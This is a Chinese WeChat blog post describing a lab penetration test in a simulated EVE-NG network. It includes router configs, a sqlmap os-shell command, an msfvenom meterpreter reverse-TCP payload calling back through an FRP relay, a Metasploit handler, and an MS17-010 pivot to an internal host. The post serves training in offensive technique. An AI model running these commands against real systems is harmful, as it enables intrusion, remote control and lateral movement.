##  eve模拟真实环境的靶场渗透

原创 ​cttyz  [ moonsec ](javascript:void\(0\);)

**moonsec** ![]()

微信号 moon_sec

功能介绍 暗月博客

____

__

收录于话题

#渗透测试

14个

  

  

**eve模拟真实环境的靶场渗透**![](https://gitee.com/fuli009/images/raw/master/public/20210809143244.png)  

  

  

 ** _ **1**_** **拓扑图：**

![](https://gitee.com/fuli009/images/raw/master/public/20210809143248.png)

本实验模拟公网，左边kali通过sqlmap攻击右边Server_5并且os-
shell，再通过反弹shell在MSF当中建立会话，再以Server_5为跳板机攻击内网当中另外一台没有映射服务的Win2003。

  

 ** _ **2**_** **实验所用到的机器：**

攻击机（紫色部分）：kali（内网IP：192.168.117.241）

被攻击方（黄色部分）：

Server_5（内网IP：172.16.192.88），映射了HTTP到公网上

WinServer（是一台2003，内网IP：172.16.192.4）

附加：Frp_Server（是一台EVE里面的kali，模拟公网VPS：202.100.1.3）

  

 ** _ **3**_** **环境搭建：**

紫色部分

SW1：（也可以不用划分vlan，默认都在vlan1当中）

  *   *   *   *   *   *   * 

    
    
    SW1(config)#vlan10SW1(config)#interfacee0/0SW1(config-if)#switchportmode accessSW1(config-if)#switchport access vlan 10SW1(config)#int e0/1SW1(config-if)#switchport mode accessSW1(config-if)#switchport access vlan 10

R3：

  *   *   *   *   *   *   *   *   * 

    
    
    R3(config)#inte0/0R3(config-if)#ip address 192.168.117.254 255.255.255.0R3(config-if)#ip nat inside  //配置NATinsideR3(config-if)#no shutdownR3(config)#int e0/1R3(config-if)#ip address 12.0.0.1 255.255.255.0R3(config-if)#no shutdownR3(config-if)#ip nat outside  //配置NAToutsideR3(config)#access-list 11 permit 192.168.117.0 0.0.0.255 //匹配

流量  

R3(config)#ip nat inside source list 11 interface Ethernet0/1overload

这里讲究点是应该有一台DHCP服务器的，但是我内存不够了，带不动，所以直接在R3上面把DHCP服务也起了

  *   *   *   *   * 

    
    
    ip dhcp excluded-address 192.168.117.254!ip dhcp pool kalinetwork 192.168.241.0 255.255.255.0default-router 192.168.241.254

中间部分：

ISP：

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    ISP(config)#inte0/0ISP(config-if)#ip address 12.0.0.2 255.255.255.0ISP(config-if)#no shutdownISP(config)#int e0/2ISP(config-if)#ip address 202.100.1.2 255.255.255.0ISP(config-if)#no shutdownISP(config)#int e0/1ISP(config-if)#ip address 23.0.0.2 255.255.255.0ISP(config-if)#no shutdownISP(config)#int loopback 0 //建立环回口测试网络情况ISP(config-if)#ip address 2.2.2.2 255.255.255.255

  

  

黄色部分：

SW2：

  *   *   *   *   *   *   *   *   *   * 

    
    
    SW2(config)#vlan10SW2(config)#interfacee0/0SW2(config-if)#switchportmode accessSW2(config-if)#switchport access vlan 10SW2(config)#int e0/1SW2(config-if)#switchport mode accessSW2(config-if)#switchport access vlan 10SW2(config)#int e0/2SW2(config-if)#switchport mode accessSW2(config-if)#switchport access vlan 10

  

R5：

R5(config)#inte0/0

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    R5(config-if)#ip address 23.0.0.3R5(config-if)#ip nat outsideR5(config-if)#no shutdownR5(config)#int e0/1R5(config-if)#ip address 172.16.192.254 255.255.255.0R5(config-if)#no shutdownR5(config-if)#ip nat inside  //配置NAToutsideR5(config)#access-list 11 permit 172.16.192.0 0.0.0.255 //匹配流量R5(config)#ip nat inside source list 11 interface Ethernet0/1overloadR5(config)#ip nat inside source static tcp 172.16.192.88 80 23.0.0.380（把Server_5的HTTP服务映射到公网地址的80端口上）//ISP，R3，R5配置OSPF模拟公网环境

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    R3(config)#router ospf 100R3(config-router)# router-id 1.1.1.1R3(config-router)#passive-interface Ethernet0/0R3(config-router)#network 12.0.0.0 0.0.0.255 area 0  
      
    R5(config)#router ospf 100R5(config-router)# router-id 3.3.3.3R5(config-router)#passive-interface Ethernet0/1R5(config-router)#network 23.0.0.0 0.0.0.255 area 0  
      
    ISP(config)#router ospf 100ISP(config-router)# router-id 2.2.2.2ISP(config-router)# network 2.2.2.2 0.0.0.0 area 0ISP(config-router)#network 12.0.0.0 0.0.0.255 area 0ISP(config-router)#network 23.0.0.0 0.0.0.255 area 0ISP(config-router)#network 202.100.1.0 0.0.0.255 area 0

  

测试网络情况：

左边kali（通过dhclient获取地址）

![](https://gitee.com/fuli009/images/raw/master/public/20210809143249.png)

  

访问Server_5，这里做一个DNS解析（本来一开始搭建了一台公网DNS服务器模拟公网映射的，但是运行环境真的顶不住了，所以就删掉了那台设备，直接修改本地hosts文件了）

![](https://gitee.com/fuli009/images/raw/master/public/20210809143251.png)

将域名解析到23.0.0.3上面

添加完后记得重启网络服务喔

/etc/init.d/networking restart

访问一下web

![](https://gitee.com/fuli009/images/raw/master/public/20210809143252.png)

OK！暂时莫得问题！！！

配置一下中间Frp_Server（202.100.1.3）的地址（图中名字弄错了，这该是的T和R居然在一起！！！）

本来是想用一台ubuntu来作这个frp服务端的，但我的EVE当中刚好有一个kali的镜像，那就不要那么多事了直接用EVE的kali吧

  

![](https://gitee.com/fuli009/images/raw/master/public/20210809143253.png)

  

添加路由

![]()

  

装好frp

![](https://gitee.com/fuli009/images/raw/master/public/20210809143254.png)

  

开启FRP，等待侦听

![](https://gitee.com/fuli009/images/raw/master/public/20210809143255.png)

  

同时生成一个reverse.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=202.100.1.3 LPORT=6000 -fexe
> reverse.exe

![](https://gitee.com/fuli009/images/raw/master/public/20210809143256.png)

上面的LPORT=6000记得要和你frp客户端（也就是紫色的kali）配置文件当中的remote_port要一样喔

然后在当前文件夹下面开启http服务（待会要用到）

![]()

  

OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操作你也可以直接在紫色部分的kali当中直接ssh到中间这台服务器上面进行操作，这样子会更好的模拟真实环境当中的VPS效果。我这里为了记录文档就没这么做了）

下面就直接到紫色部分的Kali当中模拟攻击吧！！！（有一点忘记说了，接下来的kali当中你会看到shell的主题经常变，并不是换了一台kali，而是我的~/.zshrc当中主题部分写了”random”）

  

![](https://gitee.com/fuli009/images/raw/master/public/20210809143257.png)

  

 **1.首先先连接上 frp**

![](https://gitee.com/fuli009/images/raw/master/public/20210809143258.png)

  

![]()

  

此时你会看到远程的frp_server当中有连接提示

![](https://gitee.com/fuli009/images/raw/master/public/20210809143259.png)

  

  

 **2.使用 sqlmap直接对Server_5进行os-shell（这是月师傅SQLMAP课程当中的一台靶机）**

语句：  

  * 

    
    
    python sqlmap.py -u "http://www.dm1.com/inj.aspx?id=1" --dbmsmssql --batch --is-dba --os-shell -p id --random-agent

  

![](https://gitee.com/fuli009/images/raw/master/public/20210809143300.png)

  

那么此时，我需要这台Server_5运行我的一个反弹shell，让他可以和我的kali当中msf建立起会话，这个时候刚刚在frp_server当中启用的一个http服务就起作用了

可以看到，当前的目录路径是在C:\WINDOWS\SYSTEM32

那么，我们可以使用certutil.exe，一般看到成功完成就代表下载下来了，所以我就不dir来查看了

![](https://gitee.com/fuli009/images/raw/master/public/20210809143301.png)

  

然后kali开启msfc

  *   *   *   *   *   *   *   * 

    
    
    msf> use exploit/multi/handlermsf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload=> windows/meterpreter/reverse_tcpmsf exploit(multi/handler) > set LHOST 127.0.0.1LHOST=> 127.0.0.1msf exploit(multi/handler) > set LPORT 5555 //这里的端口是frpc上面的local端口，记得一定要一样啊LPORT=> 5555msf exploit(multi/handler) > exploit

接下来在sqlmap的os-shell当中运行reverse.exe

![](https://gitee.com/fuli009/images/raw/master/public/20210809143302.png)

  

MSF当中出现会话

![](https://gitee.com/fuli009/images/raw/master/public/20210809143303.png)

  

此时，因为我知道我还要对内网的一台2003进行渗透，那么就需要添加一下路由了，利用这台Server_5

先挂起会话，这里用post/multi/manage/autoroute

![]()

  

那么先进来shell当中看看，这里我是想直接扫描内网存活主机的，但是很容易就卡死了，所以我就直接shell到Server_5当中看arp表了

![](https://gitee.com/fuli009/images/raw/master/public/20210809143304.png)

  

172.16.192.4这台主机，这里因为前面说的扫描卡死了，所以我就没有一开始扫描判断操作系统了，因为我知道这台就是那台2003（这里很粗糙，有太多已知因素）

这里使用(windows/smb/ms17_010_psexec)对目标进行攻击

先把payload改为

![](https://gitee.com/fuli009/images/raw/master/public/20210809143305.png)

然后

![](https://gitee.com/fuli009/images/raw/master/public/20210809143306.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210809143307.png)

  

查看会话表：

![](https://gitee.com/fuli009/images/raw/master/public/20210809143308.png)

  

（这里之前失败了一次，所以2没了，直接到3了）

  

OK！！！实验结束。

 ** _ **4**_** **关注  
**

  

 **关注本公众号 不定期更新文章和视频**

 **欢迎前来关注**  

  

![]()

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

eve模拟真实环境的靶场渗透

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

